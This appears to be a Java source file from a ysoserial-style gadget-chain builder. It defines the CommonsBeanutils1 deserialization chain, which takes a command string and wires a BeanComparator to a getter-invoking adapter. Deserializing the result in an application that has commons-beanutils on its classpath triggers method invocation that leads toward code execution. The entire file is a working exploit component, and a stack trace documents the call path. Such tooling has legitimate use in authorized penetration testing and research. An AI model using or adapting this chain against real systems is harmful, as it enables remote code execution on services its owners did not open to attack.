package org.ses.gadgetbuilder.chains1;

import org.apache.commons.beanutils.BeanComparator;
import org.ses.gadgetbuilder.adapters.GetterMethodInvokeAdapter;
import org.ses.gadgetbuilder.annotations.Authors;
import org.ses.gadgetbuilder.annotations.Dependencies;
import org.ses.gadgetbuilder.annotations.Impact;
import org.ses.gadgetbuilder.chains.main.MethodInvokeGadgetChain;
import org.ses.gadgetbuilder.chains.main.TrampolineConnector;
import org.ses.gadgetbuilder.chains.trampolines.doubleparam.CompareTrampoline;
import org.ses.gadgetbuilder.util.Reflections;


@Dependencies({"commons-beanutils:commons-beanutils:1.11.0"})
@Authors({ Authors.FROHOFF, Authors.K4n5ha0 })
@Impact(Impact.MethodInvoke)
public class CommonsBeanutils1 extends MethodInvokeGadgetChain<CompareTrampoline, GetterMethodInvokeAdapter> {

    public CommonsBeanutils1(CompareTrampoline _trampoline, GetterMethodInvokeAdapter _adapter) {
        super(_trampoline, _adapter);
    }

    @Override
    protected TrampolineConnector createPayload(String command) throws Exception {
        BeanComparator comparator = new BeanComparator(this.methodInvokeAdapter.getGetterMethodProperty(), String.CASE_INSENSITIVE_ORDER);
        Object templates = this.methodInvokeAdapter.getInvocationTarget(command);
        return new TrampolineConnector(comparator, templates, templates);
    }

    @Override
    protected void postProcessPayload() throws Exception {
    }

    @Override
    protected String getStackTrace() {
        return "org.apache.commons.beanutils.BeanComparator.compare()\n" +
                "org.apache.commons.beanutils.PropertyUtils.getProperty()\n" +
                "org.apache.commons.beanutils.PropertyUtilsBean.getProperty()\n" +
                "org.apache.commons.beanutils.PropertyUtilsBean.getNestedProperty()\n" +
                "org.apache.commons.beanutils.PropertyUtilsBean.getSimpleProperty()\n" +
                "org.apache.commons.beanutils.PropertyUtilsBean.invokeMethod()\n" +
                "java.lang.reflect.Method.invoke()";
    }
}
